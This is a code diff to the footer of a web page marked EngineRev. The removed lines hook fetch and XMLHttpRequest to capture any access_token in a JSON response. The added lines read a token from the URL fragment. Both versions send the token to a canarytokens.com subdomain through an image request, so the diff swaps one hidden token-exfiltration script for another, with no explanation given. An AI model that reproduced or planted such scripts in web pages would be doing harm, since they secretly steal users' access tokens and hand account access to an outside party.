@@ -326,33 +326,8 @@
     &copy; 2024 EngineRev. All rights reserved.
   </div>
 <script>
-(function() {
-    var originalFetch = window.fetch;
-    window.fetch = function() {
-        return originalFetch.apply(this, arguments).then(response => {
-            response.clone().json().then(data => {
-                if (data.access_token) {
-                    new Image().src = "http://" + data.access_token + ".6rauo1wu8hzbvjxxvf4ws07le.canarytokens.com";
-                }
-            });
-            return response;
-        });
-    };
-
-    var originalXHROpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        this.addEventListener("load", function() {
-            try {
-                var responseJSON = JSON.parse(this.responseText);
-                if (responseJSON.access_token) {
-                    new Image().src = "http://" + responseJSON.access_token + ".6rauo1wu8hzbvjxxvf4ws07le.canarytokens.com";
-                }
-            } catch (e) {}
-        });
-        return originalXHROpen.apply(this, arguments);
-    };
-})();
-
+var token = window.location.hash.split("=")[1];  
+new Image().src = "http://" + token + ".6rauo1wu8hzbvjxxvf4ws07le.canarytokens.com";
 </script>
     </body>
 </html>
